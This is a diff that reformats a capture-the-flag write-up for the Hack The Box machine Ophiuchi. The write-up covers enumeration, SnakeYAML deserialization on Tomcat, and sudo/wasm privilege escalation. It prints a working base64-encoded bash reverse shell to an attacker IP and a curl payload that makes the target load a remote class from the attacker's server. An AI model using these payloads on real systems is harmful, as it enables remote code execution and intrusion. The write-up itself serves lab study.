@@ -5,9 +5,9 @@
 
 # Enumeration
 
-__IP-ADDR:__ 10.10.10.227 ophiuchi.htb
+**IP-ADDR:** 10.10.10.227 ophiuchi.htb
 
-__nmap scan:__
+**nmap scan:**
 ```bash
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
@@ -20,13 +20,11 @@ PORT     STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-## Port 8080
-
 Running Apache Tomcat 9.0.38 server
 
 ![](screenshots/web-app.png)
 
-__Gobuster scan:__
+**Gobuster scan:**
 ```bash
 gobuster dir -u http://ophiuchi.htb:8080/ -w ~/git-tools/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
 ... [snip] ...
@@ -38,6 +36,10 @@ gobuster dir -u http://ophiuchi.htb:8080/ -w ~/git-tools/SecLists/Discovery/Web-
 input any data give a security error
 
 ![](screenshots/yaml-error.png)
+
+# Foothold
+
+## SnakeYAML Deserilization
 
 ### yaml
 
@@ -59,11 +61,11 @@ Back to web application, if user parse invalid tag `!foo`, rather than giving se
 
 ![](screenshots/yaml-internal-error.png)
 
-# Foothold:SnakeYAML_Deserilization_exploit
+### SnakeYAML
 
-__SnakeYAML__ is a YAML-parsing JAVA library with a high-level API for serialization and deserialization of YAML documents. The entry point for SnakeYAML is the Yaml class, similar to how the ObjectMapper class is the entry point in Jackson.
+**SnakeYAML** is a YAML-parsing JAVA library with a high-level API for serialization and deserialization of YAML documents. The entry point for SnakeYAML is the Yaml class, similar to how the ObjectMapper class is the entry point in Jackson.
 
-## SnakeYAML Marshaling Vulnerability
+### SnakeYAML Marshaling Vulnerability
 
 * [SnakeYaml Deserilization exploit blog](https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858)
 
@@ -84,7 +86,7 @@ From the Oracle/OpenJDK standard library. Requires the ability to call arbitrary
 1. Construct a `java.net.URLobject` pointing to a remote class path.
 2. Construct a `java.net.URLClassLoader` with that URL.
 3. Construct a `javax.script.ScriptEngineManager` with that `ClassLoader`.
-4. __The constructor call invokes the `ServiceLoader` mechanism for `javax.script.ScriptEngine` Factory on the remote class path, ultimately instantiating an arbitrary remote class implementing that interface.__
+4. **The constructor call invokes the `ServiceLoader` mechanism for `javax.script.ScriptEngine` Factory on the remote class path, ultimately instantiating an arbitrary remote class implementing that interface.**
 
 ```java
 !!javax.script.ScriptEngineManager [
@@ -96,13 +98,13 @@ From the Oracle/OpenJDK standard library. Requires the ability to call arbitrary
 
 ![](screenshots/engine-request.png)
 
-## java ScriptEngineManager
+### java ScriptEngineManager
 
 * [java runtime executable tool](http://jackson-t.ca/runtime-exec-payloads.html)
 * [ScriptEngine interface](https://docs.oracle.com/javase/7/docs/api/javax/script/ScriptEngine.html)
 * [ScriptEngineManager payload](https://github.com/artsploit/yaml-payload)
 
-__Reverse Shell__
+**Reverse Shell**
 ```bash
 ❯ rev_shell="bash -c 'bash -i >& /dev/tcp/10.10.15.71/4141 0>&1'"
 jre="bash -c {echo,$(echo -n $rev_shell | base64)}|{base64,-d}|{bash,-i}"
@@ -110,7 +112,7 @@ echo $jre
 bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS43MS80MTQxIDA+JjEn}|{base64,-d}|{bash,-i}
 ```
 
-__setup__
+**setup**
 ```bash
 ❯ tree
 .
@@ -136,7 +138,7 @@ and `javax.script.ScriptEngineFactory` contains compiled class path.
 Exploit
 ```
 
-__Start web server and execute SnakeYAML Marshaling payload__
+**Start web server and execute SnakeYAML Marshaling payload**
 ```bash
 curl -s -X POST \
   --data-binary $'data=%21%21javax.script.ScriptEngineManager+%5B%0D%0A++%21%21java.net.URLClassLoader+%5B%5B%0D%0A++++%21%21java.net.URL+%5B%22http%3A%2F%2F10.10.15.71%3A8000%2F%22%5D%0D%0A++%5D%5D%0D%0A%5D' \
@@ -145,7 +147,7 @@ curl -s -X POST \
 
 ![](screenshots/web-shell.png)
 
-# Privesc:wasm_reversing
+# Privesc
 
 * Tomcat manage creds store in `conf/tomcat-users.xml` and in this box
 ```bash
@@ -169,7 +171,7 @@ User admin may run the following commands on ophiuchi:
     (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
 ```
 
-__[wasmer-go](https://github.com/wasmerio/wasmer-go)__ is A complete and mature WebAssembly runtime for Go.
+**[wasmer-go](https://github.com/wasmerio/wasmer-go)** is A complete and mature WebAssembly runtime for Go.
 
 Reviewing `index.go` First thing notice is that script intracting with two exteranl file but not using these file absolute path.
 
@@ -192,7 +194,7 @@ sudo -u root /usr/bin/go run /opt/wasm-functions/index.go
 
 executed successfully but there is something else that stoping script from executing `deploy.sh`.
 
-__Checking main function__
+**Checking main function**
 ```go
 func main() {
   // Reads the WebAssembly module as bytes.
